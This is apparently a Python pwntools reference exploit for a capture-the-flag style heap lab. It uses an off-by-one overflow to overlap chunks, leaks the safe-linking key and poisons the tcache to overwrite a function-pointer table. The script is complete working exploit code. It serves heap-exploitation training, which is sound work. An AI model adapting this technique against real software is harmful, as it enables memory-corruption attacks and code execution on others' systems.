#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""lab_off_by_one —— off-by-one → chunk overlap 参考 exploit

漏洞：edit(i) 用 read(0, cards[i], sizes[i] + 1)，多读 1 字节，正好改写
      相邻 chunk 的 size LSB。

利用：
  chunk1.size 由 0x31 改成 0x61 → free 进 tcache[0x60]
  malloc(0x58) 取回 chunk1 时，写入范围覆盖到 chunk2 的 size 与 tcache next
  → 把 chunk2.next 改成 &handlers ^ (chunk2>>12)（safe-linking）
  → 连续 malloc 让 tcache 头变成 &handlers → 写入 win → trigger

用法：
    cd labs/lab_off_by_one
    make
    printf '__PWNED__{offbyone_ok}\\n' > flag.txt
    python exp.py
    HOST=127.0.0.1 PORT=9999 python exp.py     # 远程（socat 起服务）
"""
import os
import sys

from pwn import *

context.arch = "amd64"
context.log_level = "info"

BIN = "./chal"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))
SZ = 0x28   # 请求 0x28 → chunk 0x30（可控的 1 字节溢出点）
BIG = 0x58  # 请求 0x58 → chunk 0x60（取回被改大后的 chunk1）


def start():
    if HOST:
        return remote(HOST, PORT)
    # ERRLOG=<file> 时把子进程 stderr 落盘，方便看 glibc 的 malloc_printerr 原文
    err = os.getenv("ERRLOG")
    return process(BIN, stderr=open(err, "wb") if err else None)


def add(p, idx, size, data):
    p.sendlineafter(b"choice: ", b"1")
    p.sendlineafter(b"index: ", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendafter(b"data: ", data)


def edit(p, idx, data):
    p.sendlineafter(b"choice: ", b"3")
    p.sendlineafter(b"index: ", str(idx).encode())
    p.sendafter(b"data: ", data)
    p.recvuntil(b"done")


def free(p, idx):
    p.sendlineafter(b"choice: ", b"4")
    p.sendlineafter(b"index: ", str(idx).encode())
    p.recvuntil(b"done")


def show(p, idx, n):
    p.sendlineafter(b"choice: ", b"2")
    p.sendlineafter(b"index: ", str(idx).encode())
    p.recvuntil(b"data: ")
    out = p.recvn(n)
    p.recvline()
    return out


def trigger(p, idx):
    p.sendlineafter(b"choice: ", b"5")
    p.sendlineafter(b"index: ", str(idx).encode())


def exploit():
    e = ELF(BIN, checksec=False)
    handlers = e.symbols["handlers"]
    win = e.symbols["win"]
    log.info("handlers = %#x (align %d), win = %#x", handlers, handlers % 16, win)

    p = start()

    # 1) 四个相邻 0x30 chunk；chunk3 只当“安全边界”：
    #    chunk1 被改成 0x61 后，free 时 nextchunk = chunk3，size 仍合法。
    add(p, 0, SZ, b"A" * SZ)
    add(p, 1, SZ, b"B" * SZ)
    add(p, 2, SZ, b"C" * SZ)
    add(p, 3, SZ, b"D" * SZ)

    # 2) off-by-one：只改 chunk1.size 的 LSB，0x31 -> 0x61（prev_inuse 位保留）
    edit(p, 0, b"A" * SZ + b"\x61")

    # 3) chunk1（0x60）进 tcache[0x60]；chunk2（0x30）进 tcache[0x30]
    free(p, 1)
    free(p, 2)
    page = u64(show(p, 2, 8))             # chunk2->next = chunk2 >> 12
    log.success("safe-linking page key = %#x", page)

    # 4) 取回 chunk1，覆写 chunk2.size 与 chunk2->next（overlap）
    #    偏移注意：chunk1 “名义上”已被改成 0x60，但物理布局仍是 0x30：
    #    chunk2 的头就落在 chunk1.user + 0x20（prev_size）/ + 0x28（size）。
    payload = (
        b"P" * 0x20                        # chunk1 的 user 前 0x20 字节
        + p64(0)                           # chunk2.prev_size
        + p64(0x31)                        # chunk2.size（恢复合法）
        + p64(handlers ^ page)             # chunk2->next = &handlers ^ key
        + p64(0)                           # chunk2->key
    )
    add(p, 4, BIG, payload.ljust(BIG, b"\x00"))

    # 5) 弹出 chunk2 → tcache 头变成 &handlers；下一次 malloc 落在 handlers[]
    add(p, 5, SZ, b"E" * SZ)
    add(p, 6, SZ, p64(win).ljust(SZ, b"\x00"))

    trigger(p, 0)
    p.recvuntil(b"here is your flag:")
    return p.recvall(timeout=5)


if __name__ == "__main__":
    out = exploit()
    sys.stdout.buffer.write(out)
    sys.stdout.write("\n" if not out.endswith(b"\n") else "")
    if b"__PWNED__" not in out:
        raise SystemExit("[-] 没拿到 flag，检查 labs/lab_off_by_one/flag.txt")
    log.success("off-by-one -> overlap OK")
